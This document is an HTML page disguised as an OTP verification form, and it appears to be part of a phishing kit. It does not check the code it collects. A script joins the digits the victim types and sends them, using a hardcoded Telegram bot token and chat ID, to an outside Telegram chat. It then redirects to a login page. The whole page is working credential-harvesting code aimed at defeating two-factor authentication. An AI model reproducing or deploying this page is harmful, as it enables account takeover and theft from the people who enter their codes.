<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Input Form</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #a0e1eb, #09d62c);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .otp-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
            padding: 30px;
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        
        h2 {
            color: #007BFF;
            margin-bottom: 20px;
            font-weight: 500;
        }
        
        .otp-input {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
        }
        
        .otp-input input {
            width: 50px;
            height: 40px;
            font-size: 24px;
            text-align: center;
            border: none;
            border-bottom: 2px solid #ccc;
            transition: border-color 0.3s;
            outline: none;
        }
        
        .otp-input input:focus {
            border-bottom: 2px solid #007BFF;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        }
        
        .btn {
            margin-top: 15px;
            padding: 12px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s, transform 0.3s;
        }
        
        .btn:hover {
            background-color: #0056b3;
            transform: translateY(-2px);
        }
    </style>
</head>

<body>
    <div class="otp-container">
        <h2>Enter OTP</h2>
        <div class="otp-input">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp2')" id="otp1">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp3')" id="otp2">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp4')" id="otp3">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp5')" id="otp4">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp6')" id="otp5">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp7')" id="otp6">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp8')" id="otp7">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'submitButton')" id="otp8">
        </div>
        <button id="submitButton" class="btn">Verify</button>
    </div>

    <script>
        function moveFocus(current, nextId) {
            if (current.value.length >= 1) {
                document.getElementById(nextId).focus();
            }
        }

        document.getElementById('submitButton').addEventListener('click', function() {
            let otp = '';
            for (let i = 1; i <= 8; i++) {
                otp += document.getElementById('otp' + i).value;
            }

            if (otp.length >= 4 && otp.length <= 8) {
                // Send OTP to Telegram bot
                const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
                const chatId = '5615316142';
                const message = `Received OTP: ${otp}`;

                // Send the data to Telegram
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                        }),
                    })
                    .then(response => {
                        if (response.ok) {
                            // Redirect to pin.html after successful OTP entry
                            window.location.href = "login.html";
                        } else {
                            alert('Error sending OTP to Telegram.');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('Error occurred while sending OTP.');
                    });
            } else {
                alert('Please enter a valid OTP of 4 to 8 digits.');
            }
        });
    </script>
</body>

</html>
